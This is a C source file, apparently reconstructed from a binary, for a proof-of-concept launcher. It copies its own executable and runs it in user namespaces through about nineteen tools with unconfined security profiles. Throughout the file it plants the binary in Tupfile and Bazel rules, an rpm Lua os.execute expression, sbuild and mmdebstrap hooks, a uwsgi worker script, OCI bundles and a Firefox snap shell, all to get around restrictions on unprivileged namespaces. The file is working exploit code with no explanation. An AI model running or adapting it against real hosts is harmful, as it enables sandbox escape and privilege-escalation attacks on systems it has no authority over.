// SPDX-License-Identifier: GPL-2.0
/* Behavior-faithful reconstruction of launcher.c, ELF 0x406b00..0x4094cf. */
#define _GNU_SOURCE
#define _XOPEN_SOURCE 700
#include <errno.h>
#include <fcntl.h>
#include <ftw.h>
#include <limits.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include "launcher.h"

#define LAUNCHER_ERROR 125
#define LAUNCHER_NOT_FOUND 127

const struct launcher_backend launcher_backends[LAUNCHER_COUNT] = {
    { "podman",         "/usr/bin/podman",         "podman (unconfined)",          0, 1 },
    { "buildah",        "/usr/bin/buildah",        "buildah (unconfined)",         1, 1 },
    { "rootlesskit",    "/usr/bin/rootlesskit",    "rootlesskit (unconfined)",     2, 1 },
    { "opam",           "/usr/bin/opam",           "opam (unconfined)",            3, 1 },
    { "tup",            "/usr/bin/tup",            "tup (unconfined)",             4, 1 },
    { "ch-run",         "/usr/bin/ch-run",         "ch-run (unconfined)",          5, 1 },
    { "mmdebstrap",     "/usr/bin/mmdebstrap",     "mmdebstrap (unconfined)",      6, 1 },
    { "lxc-usernsexec", "/usr/bin/lxc-usernsexec", "lxc-usernsexec (unconfined)",  7, 1 },
    { "vdens",          "/usr/bin/vdens",          "vdens (unconfined)",           8, 1 },
    { "vpnns",          "/usr/bin/vpnns",          "vpnns (unconfined)",           9, 1 },
    { "userbindmount",  "/usr/bin/userbindmount",  "userbindmount (unconfined)",  10, 1 },
    { "rpm",            "/usr/bin/rpm",            "rpm (unconfined)",            11, 1 },
    { "bazel",          "/usr/bin/bazel",          "linux-sandbox (unconfined)",  12, 1 },
    { "uwsgi-core",     "/usr/bin/uwsgi-core",     "uwsgi-core (unconfined)",     13, 1 },
    { "libcamerify",    "/usr/bin/libcamerify",    "libcamerify (unconfined)",    14, 1 },
    { "runc",           "/usr/sbin/runc",          "runc (unconfined)",           15, 0 },
    { "crun",           "/usr/bin/crun",           "crun (unconfined)",           16, 0 },
    { "sbuild",         "/usr/bin/sbuild",         "sbuild",                      17, 0 },
    { "firefox_snap",  "/usr/bin/snap",            "snap.firefox.firefox (enforce)", 18, 1 },
};

static int copy_executable(const char *source, const char *destination)
{
    char buf[65536];
    int in = -1, out = -1, rc = -1;

    in = open(source, O_RDONLY | O_CLOEXEC);
    out = open(destination, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0500);
    if (in < 0 || out < 0)
        goto done;
    for (;;) {
        ssize_t n = read(in, buf, sizeof(buf));
        size_t off = 0;

        if (n < 0)
            goto done;
        if (n == 0)
            break;
        while (off < (size_t)n) {
            ssize_t written = write(out, buf + off, (size_t)n - off);
            if (written <= 0)
                goto done;
            off += (size_t)written;
        }
    }
    if (fsync(out) == 0 && fchmod(out, 0555) == 0)
        rc = 0;
done:
    if (in >= 0)
        close(in);
    if (out >= 0)
        close(out);
    return rc;
}

static int write_file(const char *path, const char *text, mode_t mode)
{
    size_t length = strlen(text), off = 0;
    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, mode);

    if (fd < 0)
        return -1;
    while (off < length) {
        ssize_t n = write(fd, text + off, length - off);
        if (n <= 0) {
            close(fd);
            return -1;
        }
        off += (size_t)n;
    }
    return close(fd);
}

static int remove_entry(const char *path, const struct stat *st, int type,
                        struct FTW *ftw)
{
    (void)st;
    (void)type;
    (void)ftw;
    return remove(path);
}

static void cleanup_tree(const char *name, const char *path)
{
    if (path[0] && access(path, F_OK) == 0 &&
        nftw(path, remove_entry, 32, FTW_DEPTH | FTW_PHYS) < 0)
        fprintf(stderr, "LAUNCHER_CLEANUP_FAIL name=%s path=%s errno=%d\n",
                name, path, errno);
}

static int read_status_file(const char *path)
{
    char buf[32] = {0}, *end;
    long value;
    int fd = open(path, O_RDONLY | O_CLOEXEC);
    ssize_t n;

    if (fd < 0)
        return LAUNCHER_ERROR;
    n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0)
        return LAUNCHER_ERROR;
    errno = 0;
    value = strtol(buf, &end, 10);
    return errno == 0 && end != buf && value >= 0 && value < 256
        ? (int)value : LAUNCHER_ERROR;
}

static int spawn(char *const argv[], const char *directory,
                 const struct launcher_backend *backend)
{
    int status;
    pid_t pid;

    fflush(NULL);
    pid = fork();
    if (pid == 0) {
        if (directory && chdir(directory) < 0) {
            perror("launcher chdir");
            _Exit(LAUNCHER_ERROR);
        }
        if (backend && setenv("SKB_POC_LAUNCHER", backend->name, 1) < 0)
            _Exit(LAUNCHER_ERROR);
        execv(argv[0], argv);
        perror("launcher exec");
        _Exit(errno == ENOENT ? LAUNCHER_NOT_FOUND : 126);
    }
    if (pid < 0 || waitpid(pid, &status, 0) < 0)
        return LAUNCHER_ERROR;
    if (WIFEXITED(status))
        return WEXITSTATUS(status);
    if (WIFSIGNALED(status))
        return 128 + WTERMSIG(status);
    return LAUNCHER_ERROR;
}

static int make_poc(const char *directory, const char *self, char path[PATH_MAX])
{
    int n = snprintf(path, PATH_MAX, "%s/poc", directory);
    return n > 0 && n < PATH_MAX ? copy_executable(self, path) : -1;
}

static int run_tup(const struct launcher_backend *backend, const char *self,
                   const char *stage)
{
    char dir[] = "/tmp/skb-poc-tup.XXXXXX", poc[PATH_MAX], tupfile[PATH_MAX];
    char rule[1024];
    char *init_argv[] = { (char *)backend->executable, "init", NULL };
    char *run_argv[] = { (char *)backend->executable, NULL };
    int rc = LAUNCHER_ERROR;

    if (!mkdtemp(dir) || make_poc(dir, self, poc) < 0 ||
        snprintf(tupfile, sizeof(tupfile), "%s/Tupfile", dir) >= (int)sizeof(tupfile) ||
        snprintf(rule, sizeof(rule),
                 ": |> SKB_POC_LAUNCHER=tup ./poc %s && /usr/bin/touch %%o |> done\n",
                 stage) >= (int)sizeof(rule) || write_file(tupfile, rule, 0444) < 0)
        goto out;
    if (spawn(init_argv, dir, NULL) == 0)
        rc = spawn(run_argv, dir, backend);
out:
    cleanup_tree(backend->name, dir);
    return rc;
}

static int run_bazel(const struct launcher_backend *backend, const char *self,
                     const char *stage)
{
    char dir[] = "/tmp/skb-poc-bazel.XXXXXX";
    char poc[PATH_MAX], workspace[PATH_MAX], build[PATH_MAX], output[PATH_MAX];
    char rule[2048];
    int rc = LAUNCHER_ERROR;

    if (!mkdtemp(dir) || make_poc(dir, self, poc) < 0 ||
        snprintf(workspace, sizeof(workspace), "%s/WORKSPACE", dir) >= (int)sizeof(workspace) ||
        snprintf(build, sizeof(build), "%s/BUILD", dir) >= (int)sizeof(build) ||
        snprintf(output, sizeof(output), "%s/output", dir) >= (int)sizeof(output) ||
        write_file(workspace, "", 0444) < 0 ||
        snprintf(rule, sizeof(rule),
                 "genrule(name=\"probe\", srcs=[\"poc\"], outs=[\"done\"], "
                 "cmd=\"SKB_POC_LAUNCHER=bazel $(location poc) %s && /usr/bin/touch $@\")\n",
                 stage) >= (int)sizeof(rule) || write_file(build, rule, 0444) < 0)
        goto out;
    {
        char *argv[] = { (char *)backend->executable, "--batch", "--nohome_rc",
                         "--output_base", output, "build",
                         "--spawn_strategy=sandboxed", "--strategy=Genrule=sandboxed",
                         "//:probe", NULL };
        rc = spawn(argv, dir, backend);
    }
out:
    cleanup_tree(backend->name, dir);
    return rc;
}

static int mkdir_join(const char *root, const char *name)
{
    char path[PATH_MAX];
    return snprintf(path, sizeof(path), "%s/%s", root, name) < (int)sizeof(path)
        ? mkdir(path, 0755) : -1;
}

static int link_join(const char *root, const char *name, const char *target)
{
    char path[PATH_MAX];
    return snprintf(path, sizeof(path), "%s/%s", root, name) < (int)sizeof(path)
        ? symlink(target, path) : -1;
}

static int run_charliecloud(const struct launcher_backend *backend,
                            const char *self, const char *stage)
{
    static const char *dirs[] = { "proc", "sys", "dev", "tmp", "home", "etc", "usr", "run" };
    static const struct { const char *name, *target; } links[] = {
        { "bin", "usr/bin" }, { "lib", "usr/lib" }, { "lib64", "usr/lib64" },
    };
    char dir[] = "/tmp/skb-poc-ch-run.XXXXXX", root[PATH_MAX], poc[PATH_MAX];
    size_t i;
    int rc = LAUNCHER_ERROR;

    if (!mkdtemp(dir) || snprintf(root, sizeof(root), "%s/root", dir) >= (int)sizeof(root) ||
        mkdir(root, 0755) < 0)
        goto out;
    for (i = 0; i < sizeof(dirs) / sizeof(dirs[0]); i++)
        if (mkdir_join(root, dirs[i]) < 0)
            goto out;
    for (i = 0; i < sizeof(links) / sizeof(links[0]); i++)
        if (link_join(root, links[i].name, links[i].target) < 0)
            goto out;
    if (make_poc(root, self, poc) < 0)
        goto out;
    {
        char *argv[] = { (char *)backend->executable, "--no-passwd", "--bind=/usr:/usr",
                         root, "--", "/poc", (char *)stage, NULL };
        rc = spawn(argv, NULL, backend);
    }
out:
    cleanup_tree(backend->name, dir);
    return rc;
}

static int run_mmdebstrap(const struct launcher_backend *backend,
                          const char *self, const char *stage, const char *suite)
{
    char dir[] = "/tmp/skb-poc-mmdebstrap.XXXXXX", poc[PATH_MAX], tar[PATH_MAX];
    char hook[4352];
    int rc = LAUNCHER_ERROR;

    if (!suite || !mkdtemp(dir) || chmod(dir, 0755) < 0 ||
        make_poc(dir, self, poc) < 0 ||
        snprintf(tar, sizeof(tar), "%s/root.tar", dir) >= (int)sizeof(tar) ||
        snprintf(hook, sizeof(hook),
                 "--setup-hook=SKB_POC_LAUNCHER=mmdebstrap /usr/bin/unshare "
                 "--user --map-user=1000 --map-group=1000 %s %s", poc, stage) >= (int)sizeof(hook))
        goto out;
    {
        char *argv[] = { (char *)backend->executable, "--mode=unshare", "--variant=custom",
                         "--skip=update", "--format=tar", hook, (char *)suite, tar,
                         "http://archive.ubuntu.com/ubuntu", NULL };
        rc = spawn(argv, NULL, backend);
    }
out:
    cleanup_tree(backend->name, dir);
    return rc;
}

static int run_lxc_usernsexec(const struct launcher_backend *backend,
                              const char *self, const char *stage)
{
    char dir[] = "/tmp/skb-poc-lxc.XXXXXX", poc[PATH_MAX];
    int rc = LAUNCHER_ERROR;

    if (!mkdtemp(dir) || chmod(dir, 0755) < 0 || make_poc(dir, self, poc) < 0)
        goto out;
    {
        char *argv[] = { (char *)backend->executable, "--", "/usr/bin/unshare", "--user",
                         "--map-user=1000", "--map-group=1000", poc, (char *)stage, NULL };
        rc = spawn(argv, NULL, backend);
    }
out:
    cleanup_tree(backend->name, dir);
    return rc;
}

static int run_sbuild(const struct launcher_backend *backend, const char *self,
                      const char *stage, const char *suite)
{
    static const char control[] =
        "Source: skb-launcher\nSection: misc\nPriority: optional\n"
        "Maintainer: Reviewer <reviewer@invalid>\nBuild-Depends: debhelper-compat (= 13)\n"
        "Standards-Version: 4.7.0\n\nPackage: skb-launcher\nArchitecture: any\n"
        "Description: bounded launcher fixture\n";
    static const char changelog[] =
        "skb-launcher (1.0) unstable; urgency=medium\n\n  * Bounded launcher fixture.\n\n"
        " -- Reviewer <reviewer@invalid>  Thu, 01 Jan 2026 00:00:00 +0000\n";
    const char *home = getenv("HOME");
    char dir[] = "/tmp/skb-poc-sbuild.XXXXXX", poc[PATH_MAX], cache[PATH_MAX] = {0};
    char package[PATH_MAX], debian[PATH_MAX], source[PATH_MAX], path[PATH_MAX];
    char dsc[PATH_MAX], hook[PATH_MAX];
    int rc = LAUNCHER_ERROR;

    if (!home || !suite || !mkdtemp(dir) ||
        snprintf(cache, sizeof(cache), "%s/.cache/sbuild/%s-amd64.tar", home, suite) >= (int)sizeof(cache) ||
        access(cache, R_OK) < 0) {
        if (cache[0])
            fprintf(stderr, "LAUNCHER_PRECONDITION_FAIL name=sbuild required=%s\n", cache);
        goto out;
    }
    if (snprintf(package, sizeof(package), "%s/skb-launcher-1.0", dir) >= (int)sizeof(package) ||
        snprintf(debian, sizeof(debian), "%s/debian", package) >= (int)sizeof(debian) ||
        snprintf(source, sizeof(source), "%s/source", debian) >= (int)sizeof(source) ||
        mkdir(package, 0755) < 0 || mkdir(debian, 0755) < 0 || mkdir(source, 0755) < 0 ||
        make_poc(dir, self, poc) < 0)
        goto out;
#define WRITE_DEBIAN(name, text, mode) \
    (snprintf(path, sizeof(path), "%s/%s", debian, name) >= (int)sizeof(path) || \
     write_file(path, text, mode) < 0)
    if (WRITE_DEBIAN("control", control, 0444) ||
        WRITE_DEBIAN("changelog", changelog, 0444) ||
        WRITE_DEBIAN("rules", "#!/usr/bin/make -f\n%:\n\tdh $@\n", 0555) ||
        snprintf(path, sizeof(path), "%s/format", source) >= (int)sizeof(path) ||
        write_file(path, "3.0 (native)\n", 0444) < 0)
        goto out;
#undef WRITE_DEBIAN
    {
        char *dpkg[] = { "/usr/bin/dpkg-source", "-b", package, NULL };
        if (spawn(dpkg, dir, NULL) != 0)
            goto out;
    }
    if (snprintf(dsc, sizeof(dsc), "%s/skb-launcher_1.0.dsc", dir) >= (int)sizeof(dsc) ||
        snprintf(hook, sizeof(hook), "--pre-build-commands=SKB_POC_LAUNCHER=sbuild %s %s",
                 poc, stage) >= (int)sizeof(hook))
        goto out;
    {
        char *argv[] = { (char *)backend->executable, "--chroot-mode=unshare", "--dist",
                         (char *)suite, "--chroot", cache, "--no-run-lintian",
                         "--no-run-autopkgtest", "--log-external-command-output", hook,
                         dsc, NULL };
        rc = spawn(argv, dir, backend);
    }
out:
    cleanup_tree(backend->name, dir);
    return rc;
}

static int run_rpm(const struct launcher_backend *backend, const char *self,
                   const char *stage)
{
    char dir[] = "/tmp/skb-poc-rpm.XXXXXX", poc[PATH_MAX], status[PATH_MAX], expr[PATH_MAX];
    int rc = LAUNCHER_ERROR;

    if (!mkdtemp(dir) || make_poc(dir, self, poc) < 0 ||
        snprintf(status, sizeof(status), "%s/status", dir) >= (int)sizeof(status) ||
        snprintf(expr, sizeof(expr),
                 "%%{lua:local a,b,c=os.execute(\"SKB_POC_LAUNCHER=rpm %s %s\"); "
                 "local f=assert(io.open(\"%s\",\"w\")); "
                 "f:write(tostring((a==true and 0) or c or a),\"\\n\"); f:close()}",
                 poc, stage, status) >= (int)sizeof(expr))
        goto out;
    {
        char *argv[] = { (char *)backend->executable, "--eval", expr, NULL };
        (void)spawn(argv, NULL, backend);
        rc = read_status_file(status);
    }
out:
    cleanup_tree(backend->name, dir);
    return rc;
}

static int run_uwsgi(const struct launcher_backend *backend, const char *self,
                     const char *stage)
{
    char dir[] = "/tmp/skb-poc-uwsgi.XXXXXX", poc[PATH_MAX], status[PATH_MAX];
    char socket_path[PATH_MAX], worker[PATH_MAX], script[PATH_MAX * 2];
    int rc = LAUNCHER_ERROR;

    if (!mkdtemp(dir) || make_poc(dir, self, poc) < 0 ||
        snprintf(status, sizeof(status), "%s/status", dir) >= (int)sizeof(status) ||
        snprintf(socket_path, sizeof(socket_path), "%s/socket", dir) >= (int)sizeof(socket_path) ||
        snprintf(worker, sizeof(worker), "%s/worker", dir) >= (int)sizeof(worker) ||
        snprintf(script, sizeof(script),
                 "#!/bin/sh\nSKB_POC_LAUNCHER=uwsgi-core %s %s\nr=$?\n"
                 "printf '%%s\\n' \"$r\" > %s\nkill -TERM $PPID\nexit $r\n",
                 poc, stage, status) >= (int)sizeof(script) ||
        write_file(worker, script, 0555) < 0)
        goto out;
    {
        char *argv[] = { (char *)backend->executable, "--master", "--workers", "1",
                         "--die-on-term", "--vacuum", "--socket", socket_path,
                         "--worker-exec", worker, NULL };
        (void)spawn(argv, NULL, backend);
        rc = read_status_file(status);
    }
out:
    cleanup_tree(backend->name, dir);
    return rc;
}

static int find_subid(const char *path, const char *user,
                      unsigned int *start, unsigned int *count)
{
    char line[512], name[256];
    FILE *stream = fopen(path, "re");

    if (!stream)
        return -1;
    while (fgets(line, sizeof(line), stream)) {
        if (sscanf(line, "%255[^:]:%u:%u", name, start, count) == 3 &&
            strcmp(name, user) == 0) {
            fclose(stream);
            return 0;
        }
    }
    fclose(stream);
    return -1;
}

static int current_username(char user[256])
{
    char line[512], name[256];
    unsigned int uid;
    FILE *stream = fopen("/etc/passwd", "re");

    if (!stream)
        return -1;
    while (fgets(line, sizeof(line), stream)) {
        if (sscanf(line, "%255[^:]:%*[^:]:%u:", name, &uid) == 2 && uid == getuid()) {
            snprintf(user, 256, "%s", name);
            fclose(stream);
            return 0;
        }
    }
    fclose(stream);
    return -1;
}

static int run_oci(const struct launcher_backend *backend, const char *self,
                   const char *stage)
{
    static const char *dirs[] = { "usr", "tmp", "proc", "dev" };
    static const struct { const char *name, *target; } links[] = {
        { "bin", "usr/bin" }, { "sbin", "usr/sbin" },
        { "lib", "usr/lib" }, { "lib64", "usr/lib64" },
    };
    char user[256], dir[] = "/tmp/skb-poc-oci.XXXXXX";
    char bundle[PATH_MAX], rootfs[PATH_MAX], state[PATH_MAX], config[PATH_MAX];
    char poc[PATH_MAX], id[64], json[16384];
    unsigned int uid_start, uid_count, gid_start, gid_count;
    size_t i;
    int rc = LAUNCHER_ERROR;

    if (current_username(user) < 0 ||
        find_subid("/etc/subuid", user, &uid_start, &uid_count) < 0 ||
        find_subid("/etc/subgid", user, &gid_start, &gid_count) < 0 ||
        uid_count < 1000 || gid_count < 1000 || !mkdtemp(dir))
        return rc;
    if (snprintf(bundle, sizeof(bundle), "%s/bundle", dir) >= (int)sizeof(bundle) ||
        snprintf(rootfs, sizeof(rootfs), "%s/rootfs", bundle) >= (int)sizeof(rootfs) ||
        snprintf(state, sizeof(state), "%s/state", dir) >= (int)sizeof(state) ||
        snprintf(config, sizeof(config), "%s/config.json", bundle) >= (int)sizeof(config) ||
        mkdir(bundle, 0755) < 0 || mkdir(rootfs, 0755) < 0 || mkdir(state, 0755) < 0)
        goto out;
    for (i = 0; i < sizeof(dirs) / sizeof(dirs[0]); i++)
        if (mkdir_join(rootfs, dirs[i]) < 0)
            goto out;
    for (i = 0; i < sizeof(links) / sizeof(links[0]); i++)
        if (link_join(rootfs, links[i].name, links[i].target) < 0)
            goto out;
    if (make_poc(rootfs, self, poc) < 0 ||
        snprintf(id, sizeof(id), "skb-poc-%s-%ld", backend->name, (long)getpid()) >= (int)sizeof(id) ||
        snprintf(json, sizeof(json),
            "{\"ociVersion\":\"1.2.0\",\"process\":{\"terminal\":false,"
            "\"user\":{\"uid\":1000,\"gid\":1000},\"args\":[\"/poc\",\"%s\"],"
            "\"env\":[\"PATH=/usr/sbin:/usr/bin:/sbin:/bin\",\"SKB_POC_LAUNCHER=%s\"],"
            "\"cwd\":\"/\",\"noNewPrivileges\":false,\"capabilities\":{\"bounding\":[],"
            "\"permitted\":[],\"effective\":[],\"ambient\":[]}},"
            "\"root\":{\"path\":\"rootfs\",\"readonly\":false},\"mounts\":["
            "{\"destination\":\"/proc\",\"type\":\"proc\",\"source\":\"proc\"},"
            "{\"destination\":\"/dev\",\"type\":\"tmpfs\",\"source\":\"tmpfs\","
            "\"options\":[\"nosuid\",\"strictatime\",\"mode=755\",\"size=65536k\"]},"
            "{\"destination\":\"/usr\",\"type\":\"bind\",\"source\":\"/usr\","
            "\"options\":[\"rbind\",\"ro\"]},{\"destination\":\"/tmp\","
            "\"type\":\"bind\",\"source\":\"/tmp\",\"options\":[\"rbind\",\"rw\"]}],"
            "\"linux\":{\"namespaces\":[{\"type\":\"mount\"},{\"type\":\"uts\"},"
            "{\"type\":\"ipc\"},{\"type\":\"pid\"},{\"type\":\"network\"},"
            "{\"type\":\"user\"}],\"uidMappings\":[{\"containerID\":0,\"hostID\":1000,"
            "\"size\":1},{\"containerID\":1,\"hostID\":%u,\"size\":%u}],"
            "\"gidMappings\":[{\"containerID\":0,\"hostID\":1000,\"size\":1},"
            "{\"containerID\":1,\"hostID\":%u,\"size\":%u}],\"maskedPaths\":[],"
            "\"readonlyPaths\":[]}}\n",
            stage, backend->name, uid_start, uid_count, gid_start, gid_count) >= (int)sizeof(json) ||
        write_file(config, json, 0444) < 0)
        goto out;
    {
        char *argv[] = { (char *)backend->executable, "--root", state, "--rootless=true",
                         "run", "--bundle", bundle, id, NULL };
        rc = spawn(argv, NULL, NULL);
    }
out:
    cleanup_tree(backend->name, dir);
    return rc;
}

static int run_vpnns(const struct launcher_backend *backend, const char *self,
                     const char *stage)
{
    const char *home = getenv("HOME");
    char dir[PATH_MAX], *base, name[64];
    int rc = LAUNCHER_ERROR;

    if (!home || snprintf(dir, sizeof(dir), "%s/.vpnns-skb-poc.XXXXXX", home) >= (int)sizeof(dir) ||
        !mkdtemp(dir))
        return rc;
    base = strrchr(dir, '/');
    if (!base || strncmp(base + 1, ".vpnns-", 7) != 0 ||
        snprintf(name, sizeof(name), "%s", base + 8) >= (int)sizeof(name) || rmdir(dir) < 0)
        goto out;
    {
        char *argv[] = { (char *)backend->executable, "--name", name, "--",
                         "/usr/bin/unshare", "--user", "--map-user=1000",
                         "--map-group=1000", (char *)self, (char *)stage, NULL };
        rc = spawn(argv, NULL, backend);
    }
out:
    cleanup_tree(backend->name, dir);
    return rc;
}

const struct launcher_backend *launcher_find(const char *name)
{
    static const struct { const char *alias, *canonical; } aliases[] = {
        { "charliecloud", "ch-run" }, { "lxc", "lxc-usernsexec" },
        { "ocproxy", "vpnns" }, { "bazel-bootstrap", "bazel" },
        { "libcamera-tools", "libcamerify" },
    };
    size_t i;

    if (!name)
        return NULL;
    for (i = 0; i < sizeof(aliases) / sizeof(aliases[0]); i++)
        if (strcmp(name, aliases[i].alias) == 0) {
            name = aliases[i].canonical;
            break;
        }
    for (i = 0; i < LAUNCHER_COUNT; i++)
        if (strcmp(name, launcher_backends[i].name) == 0)
            return &launcher_backends[i];
    return NULL;
}

int launcher_installed(const struct launcher_backend *backend)
{
    return backend && access(backend->executable, X_OK) == 0;
}

static int run_firefox_snap(const struct launcher_backend *backend, const char *self,
                             const char *stage)
{
    const char *home = getenv("HOME");
    char bin_path[PATH_MAX], cmd_path[PATH_MAX];
    char cmd[PATH_MAX + 64];
    const char *snap_stage;
    int cmd_fd, cmdlen, n, status;
    pid_t child;

    if (!home)
        return LAUNCHER_ERROR;

    snap_stage = (!strcmp(stage, "--internal-probe"))      ? "--internal-snap-probe" :
                 (!strcmp(stage, "--internal-transition")) ? "--internal-snap-transition" :
                 stage;

    n = snprintf(bin_path, sizeof(bin_path), "%s/snap/firefox/common/.zf_snap", home);
    if (n <= 0 || n >= (int)sizeof(bin_path))
        return LAUNCHER_ERROR;

    n = snprintf(cmd_path, sizeof(cmd_path), "%s/snap/firefox/common/.zf_cmd_XXXXXX", home);
    if (n <= 0 || n >= (int)sizeof(cmd_path))
        return LAUNCHER_ERROR;

    if (copy_executable(self, bin_path) < 0)
        return LAUNCHER_ERROR;

    cmd_fd = mkstemp(cmd_path);
    if (cmd_fd < 0) {
        unlink(bin_path);
        return LAUNCHER_ERROR;
    }
    cmdlen = snprintf(cmd, sizeof(cmd), "%s %s\n", bin_path, snap_stage);
    if (cmdlen <= 0 || cmdlen >= (int)sizeof(cmd) ||
        write(cmd_fd, cmd, (size_t)cmdlen) != (ssize_t)cmdlen) {
        close(cmd_fd);
        unlink(cmd_path);
        unlink(bin_path);
        return LAUNCHER_ERROR;
    }
    close(cmd_fd);

    fflush(NULL);
    child = fork();
    if (child < 0) {
        unlink(cmd_path);
        unlink(bin_path);
        return LAUNCHER_ERROR;
    }
    if (child == 0) {
        int script_fd = open(cmd_path, O_RDONLY);
        if (script_fd < 0 || dup2(script_fd, STDIN_FILENO) < 0)
            _Exit(LAUNCHER_ERROR);
        close(script_fd);
        unlink(cmd_path);
        if (setenv("SKB_POC_LAUNCHER", backend->name, 1) < 0)
            _Exit(LAUNCHER_ERROR);
        char *snap_argv[] = { "/usr/bin/snap", "run", "--shell", "firefox", NULL };
        execv("/usr/bin/snap", snap_argv);
        _Exit(errno == ENOENT ? LAUNCHER_NOT_FOUND : 126);
    }
    if (waitpid(child, &status, 0) < 0) {
        unlink(cmd_path);
        unlink(bin_path);
        return LAUNCHER_ERROR;
    }
    unlink(cmd_path);
    unlink(bin_path);
    if (WIFEXITED(status)) return WEXITSTATUS(status);
    if (WIFSIGNALED(status)) return 128 + WTERMSIG(status);
    return LAUNCHER_ERROR;
}

int launcher_run(const struct launcher_backend *backend, const char *self,
                 const char *stage, const char *suite)
{
    if (!launcher_installed(backend) || !self || !stage)
        return LAUNCHER_NOT_FOUND;
    switch (backend->kind) {
    case 0: case 1: {
        char *argv[] = { (char *)backend->executable, "unshare", "/usr/bin/unshare",
                         "--user", "--map-user=1000", "--map-group=1000",
                         (char *)self, (char *)stage, NULL };
        return spawn(argv, NULL, backend);
    }
    case 2: {
        char *argv[] = { (char *)backend->executable, "/usr/bin/unshare", "--user",
                         "--map-user=1000", "--map-group=1000",
                         (char *)self, (char *)stage, NULL };
        return spawn(argv, NULL, backend);
    }
    case 3: {
        char *argv[] = { (char *)backend->executable, "exec", "--",
                         (char *)self, (char *)stage, NULL };
        return spawn(argv, NULL, backend);
    }
    case 4: return run_tup(backend, self, stage);
    case 5: return run_charliecloud(backend, self, stage);
    case 6: return run_mmdebstrap(backend, self, stage, suite);
    case 7: return run_lxc_usernsexec(backend, self, stage);
    case 8: {
        char *argv[] = { (char *)backend->executable, "-s", "no", "/usr/bin/unshare",
                         "--user", "--map-user=1000", "--map-group=1000",
                         (char *)self, (char *)stage, NULL };
        return spawn(argv, NULL, backend);
    }
    case 9: return run_vpnns(backend, self, stage);
    case 10: {
        char *argv[] = { (char *)backend->executable, "-n", "-s", "--",
                         "/usr/bin/unshare", "--user", "--map-user=1000",
                         "--map-group=1000", (char *)self, (char *)stage, NULL };
        return spawn(argv, NULL, backend);
    }
    case 11: return run_rpm(backend, self, stage);
    case 12: return run_bazel(backend, self, stage);
    case 13: return run_uwsgi(backend, self, stage);
    case 14: {
        char *argv[] = { (char *)backend->executable, "/usr/bin/env", "-u", "LD_PRELOAD",
                         (char *)self, (char *)stage, NULL };
        return spawn(argv, NULL, backend);
    }
    case 15: case 16: return run_oci(backend, self, stage);
    case 17: return run_sbuild(backend, self, stage, suite);
    case 18: return run_firefox_snap(backend, self, stage);
    default: return LAUNCHER_ERROR;
    }
}
